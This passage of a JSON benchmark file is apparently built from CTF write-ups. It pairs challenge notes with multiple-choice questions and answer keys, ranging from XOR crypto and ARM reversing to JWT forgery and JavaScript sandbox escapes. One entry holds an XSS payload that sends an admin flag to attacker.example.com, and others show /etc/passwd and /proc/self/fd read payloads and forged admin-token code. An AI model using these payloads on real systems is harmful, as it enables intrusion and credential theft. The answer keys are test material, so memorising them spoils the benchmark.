            "When trying to identify the type of a `.damaged` file in a forensics challenge, what is an effective initial step to take with the file's header bytes? - A. Decompile the file using a specialized forensics tool to automatically identify and fix the file type. - B. Use a hex editor to examine the file's header bytes and search for the magic number on the internet to determine its file format. - C. Immediately attempt to open the file in various software until one succeeds in displaying its contents. - D. Rename the file with random extensions until the operating system recognizes and opens it.",
            "After repairing the file header of a `.jbg2` file in a forensics challenge but failing to open the file correctly, what should be the next step to try and correct the file? - A. Increase the file's size manually in a hex editor to match the expected dimensions of the content. - B. Email the challenge organizers to ask for a hint about the file format. - C. Replace sections of the file with parts from a known good `.jbg2` file, such as size bytes and ending data markers, using a hex editor. - D. Convert the file to a different format, hoping that the conversion process will fix any existing errors."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Jigsaw",
        "write_up": "dataset/raw/Jigsaw.md",
        "type": "reverse",
        "competition": [
            "OverTheWireAdventBonanza/2021",
            "https://ctftime.org/event/1503/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When dealing with a large set of files, each potentially containing parts of encoded data (like base64 strings), examining the metadata, specifically timestamps, can be an effective strategy to determine the correct sequence for piecing together the data. This technique comes in handy when traditional methods fail, such as trying to algorithmically solve a puzzle based on the image content. It's crucial to consider all file attributes, as they might hold the key to solving the challenge.",
            "Utilizing command-line tools in a Unix-like environment (e.g., bash) for forensic analysis or data extraction can streamline the process significantly. For example, to extract, concatenate, and decode data embedded in file metadata (like EXIF comments) in a sequence determined by file modification times, one can employ a combination of `ls`, `exiftool`, `sed`, `xargs`, and `base64`. This approach is especially powerful when dealing with numerous files, allowing for an efficient and automated solution.\n\nExample command sequence to extract and decode base64 data sorted by modification time:\n```bash\nfor f in `ls -1rt`; do exiftool -Comment $f | sed -n \"s/.*'\\(.*\\)'/\\1/p\"; done | xargs | tr -d ' ' | base64 -d\n```"
        ],
        "question": [
            "In a scenario where numerous image files each contain a snippet of a base64 encoded message in the EXIF comment field, how would examining the file metadata, specifically timestamps, assist in reconstructing the original message?  - A. By identifying the oldest file to locate the beginning of the message. - B. By identifying the creator of each file to understand the encoding scheme. - C. By examining the timestamps to determine the correct sequence the files were created or modified, and arrange the snippets accordingly. - D. By using timestamps to filter out irrelevant files not part of the encoded message. ",
            "Given a set of image files with pieces of a base64-encoded secret message in their EXIF comments, which sequence of command-line tools and options will extract these comments, concatenate them while preserving the order based on modification time, remove spaces, and decode the base64 message?  - A. Use `find`, `grep`, `sort`, and `wc` to concatenate and decode messages while sorting by name. - B. Employ `ls -1rt`, `exiftool -Comment`, `sed`, `xargs`, and `base64 -d` in a bash loop to extract, sort by modification time, concatenate, remove spaces, and decode. - C. Apply `awk`, `cat`, `rev`, and `cut` to reverse engineer the encoding and decode the base64 string without considering file modification times. - D. Utilize `scp`, `telnet`, `ftp`, and `echo` to transfer files to a remote server for decoding, disregarding the timestamp altogether. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Jimmy's Crypto",
        "write_up": "dataset/raw/Jimmy's Crypto.md",
        "type": "crypto",
        "competition": [
            "TU/2018",
            "https://ctftime.org/event/650/tasks/"
        ],
        "score": 489,
        "max_score": 497,
        "difficulty": 0.9839034205231388,
        "knowledge": [
            "In challenges involving XOR encryption where the same key is used to encrypt multiple pieces of data, the ciphertexts can be XORed together to cancel out the key. This results in the XOR of the original plaintexts, which can then be analyzed to extract information or recover the plaintexts.\n   \n   Example application: If `ciphertext1 = plaintext1 XOR key` and `ciphertext2 = plaintext2 XOR key`, then `ciphertext1 XOR ciphertext2 = plaintext1 XOR plaintext2`.\n   \n   Sample Payload: N/A due to the conceptual nature of this technique.",
            "When dealing with XORed texts where one is known to be in readable English, guessing common substrings or formats in the unknown plaintext (like the format of a CTF flag, e.g., \"CTF{...}\") can be a viable technique to recover messages. This method relies on predictable structure or content within one of the plaintext messages to guess parts of the XOR key or the plaintext directly.\n\n   Condition: Useful when at least one of the plaintexts is suspected to contain commonly occurring strings or formats and the XOR of the plaintexts has been obtained.\n\n   Example Payload: Assuming `x = plaintext1 XOR plaintext2`, trying `x XOR 'knownStringFormat'` at different positions can reveal parts of the plaintext or the entire message if the guess is correct and positioned accurately."
        ],
        "question": [
            "In a scenario where XOR encryption is used with a single key to encrypt multiple messages, resulting in two ciphertexts, how might one approach decrypting these messages without direct access to the key?  Suppose you have `ciphertext1` and `ciphertext2`, which are produced by XORing `plaintext1` and `plaintext2` respectively with the same key. Which of the following operations could potentially reveal useful information by canceling out the key?  - A. `ciphertext1` AND `ciphertext2` - B. `ciphertext1` OR `ciphertext2` - C. `ciphertext1` XOR `ciphertext2` - D. `(ciphertext1` + `ciphertext2)` MOD 2 ",
            "During the analysis of XOR encrypted messages where at least one plaintext is believed to be in a readable format like English, and you've obtained the XOR of two plaintexts (let\u2019s call this `result`), which technique could assist in recovering the original messages?  Given `result = plaintext1` XOR `plaintext2`, and you suspect `plaintext2` includes a structured format common in CTF challenges (like `CTF{...}`), how could you attempt to decrypt part of or the entire plaintext?  - A. Perform a frequency analysis on `result` without additional XOR operations. - B. XOR `result` with a random string in hopes of revealing readable text. - C. XOR `result` with the expected format of `plaintext2` (e.g., 'CTF{...}') at various positions. - D. Apply a Caesar cipher to `result` to identify possible plaintext shifts. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Journey_ Chapter I",
        "write_up": "dataset/raw/Journey_ Chapter I.md",
        "type": "crypto",
        "competition": [
            "SpamAndFlags/2020/Quals",
            "https://ctftime.org/event/970/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In web challenges where session contents are stored server-side and cannot be directly manipulated due to server-side validation or encryption, an alternative approach to gain administrative access or sensitive information is through Cross-Site Scripting (XSS) vulnerabilities. This method involves injecting malicious JavaScript code into a webpage viewed by other users or administrators, triggering actions on their behalf.",
            "When the application uses shared databases between different features (like WebAuthn and a custom feature in the example), it's possible to exploit the system by crafting inputs that are accepted by one feature and then maliciously interpreted by another. Specifically, manipulating the input to control object properties or keys used in database operations can lead to unauthorized access or execution of actions, such as injecting a script that performs actions on behalf of an administrator.   \nExample payload:  \n```python\nfrom random import randint  \nimport requests as rq\n\nURL = \"http://journey.ctf.example.com\"  \nID = 'exploit' + str(randint(0, 10**9))\n\npayload = '<script>fetch(\"/get_admin\", {method:\"GET\",credentials:\"include\"}).then(response => response.text()).then(flag => window.location=\"http://attacker.example.com/log?\"+flag);</script>'\n\nchallenge = rq.post(URL+\"/webauthn/register\",  \n   json={  \n       'name': 'fav_' + ID,  \n       'displayName': payload  \n   }).json()\n\nreport = rq.get(URL+\"/report\",  \n   params={  \n       'url': URL+\"/favorites?type=displayName&favId=\"+ID,  \n   })  \n```"
        ],
        "question": [
            "In the context of a web application where the session information is securely stored on the server side, making it directly inaccessible for manipulation by an external attacker, what technique can be used to possibly gain administrative privileges or access sensitive information by exploiting a vulnerability in another part of the application? - A. SQL Injection - B. Cross-Site Scripting (XSS) - C. Server-Side Request Forgery (SSRF) - D. Directory Traversal",
            "When an application shares a database between multiple features, how can an attacker exploit this configuration to potentially execute unauthorized actions or access administrative privileges, as illustrated by using unique inputs to influence database operations across features? - A. By causing a buffer overflow in the database - B. By performing a denial of service attack on the database - C. By injecting a script that performs actions on behalf of an administrator using crafted inputs - D. By encrypting the database content with a ransomware"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "jsss",
        "write_up": "dataset/raw/jsss.md",
        "type": "web",
        "competition": [
            "ASIS/2021/Finals",
            "https://ctftime.org/event/1416/tasks/"
        ],
        "score": 953,
        "max_score": 953,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting JavaScript sandbox environments, if direct invocation of functions is restricted (e.g., by filtering specific characters like the opening parenthesis `(`), consider using tagged template literals as an alternative method to execute functions without the need for parentheses. This technique is applicable in situations where the environment allows for template literal syntax and can be particularly useful for bypassing character filters or restrictions within sandboxed code execution contexts.\n   - Example payload: `console.log\\`1\\``, `getFlag\\`\\``, `readFile\\`/etc/passwd\\``",
            "In scenarios where accessing a file directly is prevented by application logic (e.g., restrictions on accessing files with \"flag\" in the path), use the Linux `/proc` filesystem to interact with file descriptors of a process. This approach relies on understanding how the `/proc` filesystem represents process information, including opened file descriptors, which can be accessed indirectly to read files that are otherwise restricted.\n   - For creating file descriptors to a restricted file (e.g., `/flag.txt`), use recursive function calls or repeated attempts to open the restricted file, generating file descriptors in `/proc/self/fd`.\n   - To read the contents indirectly, iterate over possible file descriptor numbers, attempting to read from paths such as `/proc/self/fd/0`, `/proc/self/fd/1`, etc., until the desired file's contents are obtained. This technique is effective when direct file access is denied but the underlying system actions (such as opening files) still occur, thus leaving a trace in the `/proc` filesystem that can be exploited.\n   - Example payload (to keep trying to read `/flag.txt` and create file descriptors): `a = _=> { return readFile\\`/flag.txt\\` + readFile\\`/flag.txt\\` + a\\`\\` }, a\\`\\``\n   - Example payload (to iterate through file descriptors and attempt to read the resources they point to): `readFile\\`/proc/self/fd/0\\`, readFile\\`/proc/self/fd/1\\`, ..., readFile\\`/proc/self/fd/n\\``"
        ],
        "question": [
            "In a JavaScript sandbox challenge, if the execution of functions directly through parentheses is restricted due to character filtering, which alternative syntax allows for the invocation of functions without needing parentheses? - A. Utilizing JSON notation for function calls. - B. Employing regular expression patterns to match and call functions. - C. Using tagged template literals to execute functions. - D. Implementing asynchronous callbacks to indirectly invoke functions. ",
            "When direct file access in a Linux environment is blocked by application-specific logic, which method allows for the indirect reading of a restricted file's content, such as `/flag.txt`, through the use of the Linux `/proc` filesystem? - A. Modifying the application's code at runtime to remove file access restrictions. - B. Utilizing symbolic links in the Linux filesystem to bypass file name checks. - C. Exploiting race conditions in the filesystem to temporarily remove access restrictions. - D. Reading file descriptors in `/proc/self/fd` to access the content of files indirectly, including those restricted by the application. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Juggle",
        "write_up": "dataset/raw/Juggle.md",
        "type": "This write-up describes the \"Juggle\" CTF challenge. Based on the provided information, the challenge type is **reverse**.",
        "competition": [
            "C3CTF/2018",
            "https://ctftime.org/event/718/tasks/"
        ],
        "score": 90,
        "max_score": 500,
        "difficulty": 0.18,
        "knowledge": [
            "In a challenge involving XML and XSLT, where the task is to manipulate data within specific conditions (e.g., limiting the number or type of elements), carefully examine the logical structures and conditions outlined in the XSLT file. This may include interpreting custom logic encoded via recursion, and assertions that halt processing under certain conditions. This analysis can reveal the framework for constructing a valid XML payload that manipulates the application logic as intended.",
            "When faced with a challenge that simulates a virtual machine using XML and XSLT, instructions within the XSLT can denote operations such as pushing to a stack, conditional jumps, and arithmetic operations. Developing an understanding of how these operations can be composed to implement complex logic (e.g., binary search) or specific algorithms is crucial. This might involve translating high-level concepts into a sequence of XML-formatted instructions, potentially creating or using tools like assemblers or emulators for debugging and verification. A sample of implementing binary search with XML instructions could be conceptual but resembles assembling a list of `<plate>` operations corresponding to assembly commands (specific payload cannot be generated due to the abstract nature of the example)."
        ],
        "question": [
            "In the context of addressing an XSLT-based challenge, you encounter a scenario where the application processes an XML payload using a complex XSLT stylesheet. This stylesheet contains code that halts execution when the number of specific elements exceeds a limit. What XSLT function is correctly used to enforce this condition? - A. `xsl:for-each` - B. `xsl:if` - C. `xsl:template` - D. `xsl:value-of`",
            "During the challenge, you are tasked with utilizing XSLT instructions to manipulate a virtual stack for achieving a certain goal, such as conducting a binary search. Which of the following XML elements, when used within this stack-based computation framework, correctly represents an operation to add the top elements of the stack? - A. `<plate><add/></plate>` - B. `<plate><push/></plate>` - C. `<plate><pop/></plate>` - D. `<plate><r\u00f6sti/></plate>`"
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Junior CTF - top",
        "write_up": "dataset/raw/Junior CTF - top.md",
        "type": "crypto",
        "competition": [
            "C3CTF/2017",
            "https://ctftime.org/event/544/tasks/"
        ],
        "score": 49,
        "max_score": 477,
        "difficulty": 0.10272536687631027,
        "knowledge": [
            "If an encryption algorithm uses the current time as a seed for its random number generator, it is possible to regenerate the encryption key by determining the exact timestamp used. This is feasible because the `random` package in Python produces the same sequence of numbers for the same seed value. In scenarios where the encrypted data includes the timestamp (either in whole or partly in a predictable format), one can extract the timestamp, use it as a seed in the `random` function, and re-generate the key.",
            "When dealing with encrypted data where a known value is XORed with a part of the encryption, you can reverse-engineer this part of the encryption by applying XOR again with the known value. In the context where a fixed byte sequence (e.g., 0x88 repeated) is used, XORing the encrypted portion corresponding to the known value with the same byte sequence unveils the original data. This technique is particularly useful when you know the format or specific characteristics (such as length) of the original data that was encrypted alongside the unknown data (for example, using known plaintext attacks in cryptanalysis). \n\nExample payload based on the provided write-up for reversing the encrypted timestamp part:\n```python\nencr_time = str(msg.read())[-14:] # Assuming last 14 chars are the encrypted timestamp\ndecrypted_time = [chr(ord(m) ^ 0x88) for (m, _) in zip(encr_time, [0x88]*len(encr_time))]\nprint(''.join(decrypted_time))\n```"
        ],
        "question": [
            "In the context of a scenario where a cryptosystem uses a timestamp as a seed for the random number generator to encrypt a message, which of the following best describes the method to regenerate the original encryption key? - A. Re-use the timestamp with the `math.random()` function to get a new, unrelated key. - B. Use the `random.seed()` function with the exact same timestamp to regenerate the same sequence of random numbers, effectively recreating the original encryption key. - C. Employ the `datetime.now()` function to guess the seed based on the current time. - D. Apply a cryptographic hash function like SHA-256 to the timestamp to derive the encryption key.",
            "Considering the scenario where a piece of encrypted data is XORed with a known byte sequence (0x88 repeated) to hide the encryption timestamp, which technique would allow you to recover the original timestamp? - A. Perform an XOR operation on the encrypted data with a random byte sequence to guess the original data. - B. Apply an AES decryption algorithm, assuming the key is the sequence of known bytes. - C. XOR the encrypted data again with the same known byte sequence (e.g., 0x88 repeated) to reverse the process and reveal the original timestamp. - D. Use a RSA decryption with public key corresponding to the known byte sequence."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "junior-jwt",
        "write_up": "dataset/raw/junior-jwt.md",
        "type": "web",
        "competition": [
            "S4CTF/2021",
            "https://ctftime.org/event/1329/tasks/"
        ],
        "score": 131,
        "max_score": 500,
        "difficulty": 0.262,
        "knowledge": [
            "When attempting to exploit JWT (JSON Web Token) vulnerabilities, especially in custom implementations, changing the signing algorithm to a symmetric one (like `HS256`) and signing the token with a known key (such as the public key when it is mistakenly used for verification in symmetric contexts) can bypass authentication restrictions. This is applicable when the server code does not enforce the algorithm used for signing, allowing the client to dictate it. This technique is particularly effective in scenarios where the server is designed to use asymmetric keys (public/private) for token verification but does not adequately enforce the algorithm, thus allowing an attacker to exploit this oversight by using a symmetric algorithm with a known public key for signing.",
            "For creating a malicious JWT in challenges involving insecure JWT implementations, modify the payload to elevate the privileges (e.g., changing the role to `admin`) and sign the token with the symmetric algorithm `HS256`, using the public key if it's incorrectly used for verification. Ensure the payload is formatted correctly according to JWT standards and include necessary claims like `iat` (issued at) and `nbf` (not before) to make the token valid. This approach leverages the server's failure to properly validate the JWT's signing algorithm, allowing for authentication bypass.\n\nExample payload creation snippet:\n```php\n$publikKey  = '-----BEGIN PUBLIC KEY-----(...Actual public key content...)-----END PUBLIC KEY-----';\n$issuedAt = new DateTimeImmutable();  \n$data = [  \n    \"role\" => \"admin\",  \n    \"iat\" => $issuedAt->getTimestamp(),  \n    \"nbf\" => $issuedAt->getTimestamp()  \n];\n$token = JWT::encode($data, $publikKey, 'HS256');\necho $token;\n```\nThis payload should then be set in the `jwt` cookie to exploit the vulnerability."
        ],
        "question": [
            "In the context of exploiting JWT vulnerabilities, when a server employs asymmetric keys for verification but does not strictly enforce the signing algorithm, an attacker can change the signing algorithm to a symmetric one and utilize a known public key for signing. Which of the following algorithm changes facilitates this kind of exploit, particularly useful for bypassing authentication checks? - A. Changing the algorithm from `HS512` to `RS256` - B. Changing the algorithm from `RS256` to `HS384` - C. Changing the algorithm from `RS256` to `HS256` - D. Changing the algorithm from `ES384` to `HS512`",
            "When constructing a malicious JWT to exploit insecure JWT handling in a web application, ensuring the token contains elevated privileges (such as an `admin` role) and utilizing a specific symmetric algorithm for signing are crucial steps. Based on the provided PHP snippet, which of the following best describes the essential elements to include in the payload for this purpose? - A. Sign the token with `ES256` using the RSA private key and include claims like `exp` and `aud`. - B. Sign the token with `HS256` using the RSA public key and include claims like `role: admin` and `exp`. - C. Sign the token with `HS256` using the RSA public key and include claims like `role: admin` and `iat`. - D. Sign the token with `RS256` using the RSA private key and include claims like `jti` and `sub`."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "JuniorCTF - ARM1",
        "write_up": "dataset/raw/JuniorCTF - ARM1.md",
        "type": "reverse",
        "competition": [
            "C3CTF/2017",
            "https://ctftime.org/event/544/tasks/"
        ],
        "score": 41,
        "max_score": 477,
        "difficulty": 0.0859538784067086,
        "knowledge": [
            "When analyzing binary files for CTF challenges, especially those intended for ARM architecture, extracting strings using the `strings` command can help identify potential flags or hints without in-depth reverse engineering. This step should be attempted early in the analysis process as it may quickly reveal useful information. Example command: `strings <binary_file> | grep <known_flag_format>`. In scenarios where the flag or part of it follows a known format (e.g., starting with `34C3` in the challenge), this method is particularly effective.",
            "For reverse engineering ARM Thumb 2 code, tools like IDA can be used to disassemble the binary. Setting the \"Processor type\" to \"ARM little-endian\" and correctly configuring the \"ROM start address\" and \"Loading address\" are crucial steps for accurate disassembly and analysis. Understanding the flow of the program (identifying the entry point and the main function) enables targeted analysis towards finding the logic that deals with flag manipulations or checks. This approach is universally applicable for ARM-based binary reverse engineering challenges."
        ],
        "question": [
            "In an ARM-based CTF challenge, when trying to quickly search for flags within a binary file, which command is most suitable? - A. Use the `find` command with the binary file to search for specific text patterns. - B. Use the `grep` command directly on the binary file to search for flag patterns. - C. Use the `strings` command on the binary file, then pipe the output to `grep` with a flag pattern. - D. Modify the binary file's extension and open it in a text editor to search for flag patterns manually.",
            "When beginning to reverse engineer ARM Thumb 2 code using IDA, which of the following steps is critical for correctly setting up the environment for disassembly? - A. Setting the \"Processor type\" to \"x86 little-endian\" and adjusting both \"ROM start address\" and \"Loading address\" to match the file's needs. - B. Skipping the setup of \"Processor type\" as IDA automatically detects ARM architecture and focuses solely on analyzing the main function. - C. Setting the \"Processor type\" to \"ARM little-endian\" and correctly configuring the \"ROM start address\" and \"Loading address\" as guided in the challenge. - D. Ignoring the \"Loading address\" and \"ROM start address\" while ensuring the \"Processor type\" is set to \"AMD 64-bit\" to accommodate all ARM code variations."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "JuniorCTF - ARM2",
        "write_up": "dataset/raw/JuniorCTF - ARM2.md",
        "type": "reverse",
        "competition": [
            "C3CTF/2017",
            "https://ctftime.org/event/544/tasks/"
        ],
        "score": 150,
        "max_score": 477,
        "difficulty": 0.31446540880503143,
        "knowledge": [
            "To reverse-engineer ARM assembly code, especially when targeting STM32 microcontrollers, using IDA Pro or any compatible binary analysis tool, one should set the \"Processor type\" to \"ARM little-endian\". Additionally, it's imperative to correctly configure both the \"ROM start address\" and the \"Loading address\" to 0x8000000 (or to the appropriate memory address based on the target device or binary). This setup is crucial for accurate disassembly and analysis of ARM-based firmware or binaries.",
            "XOR encryption is a common technique for obfuscating strings or data in binary challenges. If an encrypted string is identified where each byte of the string is XOR'd with a constant value, the decryption can be performed by XOR'ing the encrypted bytes with the same constant value. This approach is particularly useful in CTF challenges where flags are obfuscated using XOR. To decrypt, a simple script iterating over the encrypted data, applying XOR with the constant key, will reveal the original plaintext.\n   - Example payload/script to decrypt XOR encrypted data:\n     ```python\n     encrypted_bytes = [0x66, 0x61, 0x16, ...]  # truncated for brevity\n     decrypted_flag = ''.join(chr(byte ^ 0x55) for byte in encrypted_bytes)\n     print(decrypted_flag)  # Outputs the decrypted flag\n     ```"
        ],
        "question": [
            "In the context of reverse-engineering ARM assembly code targeting STM32 microcontrollers, which of the following setups is crucial for accurate disassembly and analysis in IDA Pro or any similar binary analysis tool? - A. Setting \"Processor type\" to \"x86 32-bit\" and configuring \"ROM start address\" and \"Loading address\" both to 0x1FFFD8000. - B. Setting \"Processor type\" to \"ARM little-endian\" and configuring both \"ROM start address\" and \"Loading address\" to 0x8000000. - C. Setting \"Processor type\" to \"MIPS little-endian\" and leaving the \"ROM start address\" and \"Loading address\" as default. - D. Setting \"Processor type\" to \"ARM big-endian\" and configuring \"ROM start address\" to 0x8000000 and \"Loading address\" to 0x0.",
            "In the scenario of decrypting XOR-encrypted data in a CTF challenge, where each byte of the data is XOR'd with the constant 0x55, which Python script correctly decrypts the data? - A. `decrypted_flag = ''.join(chr(byte + 0x55) for byte in encrypted_bytes)` - B. `decrypted_flag = ''.join(chr(byte ^ 0x30) for byte in encrypted_bytes)` - C. `decrypted_flag = ''.join(chr(byte - 0x55) for byte in encrypted_bytes)` - D. `decrypted_flag = ''.join(chr(byte ^ 0x55) for byte in encrypted_bytes)`"
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "JuniorCTF - ARM3",
        "write_up": "dataset/raw/JuniorCTF - ARM3.md",
        "type": "reverse",
        "competition": [
            "C3CTF/2017",
            "https://ctftime.org/event/544/tasks/"
        ],
        "score": 171,
        "max_score": 477,
        "difficulty": 0.3584905660377358,
        "knowledge": [
            "When reverse engineering ARM thumb 2 code, setting up the environment correctly in IDA is crucial. This includes setting the \"Processor type\" to \"ARM little-endian\" and configuring both the \"ROM start address\" and \"Loading address\" properly, for this challenge to 0x8000000. This setup is necessary to correctly disassemble ARM binaries and trace through the execution flow accurately.",
            "To understand the logic of an embedded ARM application, identifying the main function and subsequent function calls is a critical first step. By tracing the function calls from the entry point, you can narrow down the focus to the relevant parts of the code. In this scenario, the flow was from `sub_8000108` (entry point) to `sub_80005D8`, and finally to `sub_8000290` (main function). In the main function, analyzing how input is processed and how checks are performed against this input allows for understanding the conditions needed to satisfy the challenge, thereby deducing the flag."
        ],
        "question": [
            "In the context of reverse engineering ARM thumb 2 code using IDA Pro, how should the environment be set up correctly to ensure accurate disassembly and analysis of the binary? - A. Set the \"Processor type\" to \"x86 32-bit\" and \"ROM start address\" and \"Loading address\" to 0x00000000. - B. Set the \"Processor type\" to \"ARM big-endian\" and \"ROM start address\" and \"Loading address\" to 0xFFFFFFFF. - C. Set the \"Processor type\" to \"MIPS little-endian\" and both \"ROM start address\" and \"Loading address\" to 0x10000000. - D. Set the \"Processor type\" to \"ARM little-endian\" and both \"ROM start address\" and \"Loading address\" to 0x8000000.",
            "In analyzing a reverse engineering challenge for an ARM-based application, identifying the correct sequence of function calls leading to the main function is essential. Provided the following call flow: `sub_8000108` (entry point) to `sub_80005D8`, and then `sub_8000290` (main function), what is the first critical step towards understanding the embedded application's logic? - A. Immediately modify the binary to change the entry point. - B. Skip directly to analyzing peripheral initialization routines. - C. Start by analyzing string references within the binary without tracing functions. - D. Trace the function calls from the entry point to identify the main function and understand how input is processed."
        ],
        "answer": [
            "D",
            "D"
        ]
    },
    {
        "name": "JuniorCTF - ARM4",
        "write_up": "dataset/raw/JuniorCTF - ARM4.md",
        "type": "reverse",
        "competition": [
            "C3CTF/2017",
            "https://ctftime.org/event/544/tasks/"
        ],
        "score": 290,
        "max_score": 477,
        "difficulty": 0.6079664570230608,
        "knowledge": [
            "When analyzing ARM binaries in reverse engineering challenges, particularly for embedded systems like the STM32F103 series, setting up the correct environment in IDA or a similar disassembler is crucial. This involves specifying the \"Processor type\" as \"ARM little-endian\" and correctly setting both the \"ROM start address\" and \"Loading address\", usually to 0x8000000 for STM32 series microcontrollers. This setup ensures accurate disassembly and analysis of the binary, allowing for proper understanding and manipulation of the code.",
            "For challenges involving complex mathematical or logical conditions that determine the validity of an input (e.g., a flag), symbolic execution or constraint solving can be effectively used to automate the process of finding valid inputs. Tools like Z3 can be leveraged to model the challenge's constraints as equations\u2014taking into account any known parts of the flag (e.g., a prefix like \"34C3_\") and iteratively solving to find possible solutions that satisfy all conditions. This method is particularly useful in scenarios where manual analysis is impractical due to the complexity or number of conditions.\n\nExample Python script segment utilizing Z3 for constraint solving:\n\n```python\nfrom z3 import *\n\ns = Solver()\n# Assuming x0 to x13 represent individual characters in the flag\nx = [BitVec(f'x{i}', 8) for i in range(14)]  # Create bit vectors for each character of the flag\ns.add(34*x[13]+-4*(x[1]+-5*x[0]+-16*x[2]+3*x[3])+... == 8701, ...)  # Add all given equations\n\n# If a prefix is known, for example \"34C3_\", you can add constraints like:\nprefix = \"34C3_\"\nfor i in range(len(prefix)):\n    s.add(x[i] == ord(prefix[i]))\n\n# Solve the equations\nif s.check() == sat:\n    m = s.model()\n    flag = ''.join(chr(m[x[i]].as_long()) for i in range(14))\n    print(f'Flag: {flag}')\nelse:\n    print(\"No solution found.\")\n```"
        ],
        "question": [
            "In an ARM reverse engineering challenge involving an STM32F103CBT6 microcontroller, proper setup in a disassembler is fundamental for accurate analysis. When using IDA to analyze a binary coded for this microcontroller, which combination represents the correct settings for \"Processor type,\" \"ROM start address,\" and \"Loading address\"?  - A. Processor type: \"ARM big-endian\", ROM start address: 0x1FFFF000, Loading address: 0x1FFFF800 - B. Processor type: \"x86 little-endian\", ROM start address: 0x8000000, Loading address: 0x8000000 - C. Processor type: \"ARM little-endian\", ROM start address: 0x8000000, Loading address: 0x8000000 - D. Processor type: \"MIPS little-endian\", ROM start address: 0x20000000, Loading address: 0x20005000 ",
            "When faced with a challenge that requires validating an input against complex mathematical equations to find a flag, leveraging Python and a particular tool can streamline finding the solution. Given the challenge involves equations like \"34 * flag[13] + -4 * (flag[1] - 5 * flag[0] - 16 * flag[2] + 3 * flag[3]) ... != 8701\" and a known flag prefix \"34C3_\", which tool and approach should be used to automate the solving process effectively?  - A. Use the NumPy library to numerically approximate solutions via linear regression. - B. Employ the Z3 theorem prover to model the equations as constraints and solve for the flag values. - C. Apply traditional brute-force techniques with multiprocessing to iterate over all possible flags. - D. Utilize regular expressions to extract potential flag patterns and manually verify each. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "JuniorCTF - Conversion Error",
        "write_up": "dataset/raw/JuniorCTF - Conversion Error.md",
        "type": "misc",
        "competition": [
            "C3CTF/2018",
            "https://ctftime.org/event/718/tasks/"
        ],
        "score": 87,
        "max_score": 500,
        "difficulty": 0.174,
        "knowledge": [
            "When confronted with a challenge that involves exploiting assertions in a programming language or VM, it is crucial to carefully analyze any provided assertion functions for logical weaknesses or conditions that can be met unexpectedly. In scenarios where the assertion involves complex conditionals or regular expressions, payload can be designed to make the assertion true by satisfying the overlooked or weaker parts of the condition.  \nExample payload: `alert(assert_conversion(\"1.1\"))`",
            "For challenges involving server-side code execution vulnerabilities, particularly those that offer an endpoint to test or run your own code, constructing a request with carefully crafted payload that exploits the vulnerability is key. This often involves sending requests with specific structures, taking advantage of known flaws in the implementation, such as how data types are converted or validated.  \nExample Python script snippet for sending payload:\n```Python\nurl = \"http://example.com/run\"  # The vulnerable endpoint\ndata_structure = \"\"\"{{ \"code\": {} }}\"\"\"  \ndata_content = \"\"\"alert(your_exploitative_code_here)\"\"\"  # The payload exploiting the vulnerability\n\ndata_content_to_send = json.dumps(data_content)  \ndata_to_send = data_structure.format(data_content_to_send)  \nresponse = requests.post(url, data=data_to_send)\n```"
        ],
        "question": [
            "When analyzing an external function used for assertions in a VM, a certain function was found to pass an unexpected value when a string fulfilled specific conditions. Which of the following payloads would successfully pass the assertion by exploiting the logical weakness in the function provided? - A. `alert(assert_conversion(\"0\"))` - B. `alert(assert_conversion(\"1.1\"))` - C. `alert(assert_conversion(\"false\"))` - D. `alert(assert_conversion(\"NaN\"))`",
            "In a scenario involving sending a crafted payload to exploit server-side code execution vulnerabilities, which of the following Python script snippets correctly illustrates how to structure and send a payload to a vulnerable endpoint? - A. ```Python url = \"http://vulnerable.com/execute\" data = {\"code\": \"exploit_code_here\"} response = requests.get(url, params=data) ``` - B. ```Python url = \"http://vulnerable.com/run\" data_structure = \"{{ 'code': {} }}\" data_content = \"alert(exploit_code_here)\" data_to_send = data_structure.format(data_content) response = requests.post(url, json=data_to_send) ``` - C. ```Python url = \"http://vulnerable.com/run\" data_structure = \"\"\"{{ \"code\": {} }}\"\"\" data_content = \"\"\"alert(exploit_code_here)\"\"\" data_content_to_send = json.dumps(data_content) data_to_send = data_structure.format(data_content_to_send) response = requests.post(url, data=data_to_send) ``` - D. ```Python url = \"http://vulnerable.com/execute\" data = json.dumps({\"execute\": \"alert(exploit_code_here)\"}) response = requests.post(url, headers={\"Content-Type\": \"application/json\"}, data=data) ```"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "JuniorCTF - Equality Error",
        "write_up": "dataset/raw/JuniorCTF - Equality Error.md",
        "type": "misc",
        "competition": [
            "C3CTF/2018",
            "https://ctftime.org/event/718/tasks/"
        ],
        "score": 88,
        "max_score": 500,
        "difficulty": 0.176,
        "knowledge": [
            "When targeting an application that evaluates code server-side, especially in unconventional or custom languages, understanding the language's specific behaviors and features can reveal unique vulnerabilities. In the scenario of exploiting an assertion function, one such unique behavior is how the language handles special numerical values like `NaN` (Not a Number). Exploiting this requires generating a `NaN` value, which can be done by performing operations that would mathematically be undefined, such as taking the square root of a negative number.\n\n   Example payload: `alert(assert_equals(sqrt(-1)))`",
